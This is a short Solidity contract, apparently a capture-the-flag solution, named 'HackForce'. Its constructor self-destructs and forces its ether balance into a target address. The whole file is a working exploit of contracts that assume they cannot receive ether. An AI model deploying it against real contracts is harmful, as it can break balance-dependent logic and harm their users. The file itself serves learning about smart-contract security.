// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

contract HackForce {
    constructor(address payable _target) payable {
       selfdestruct(_target);
    }
}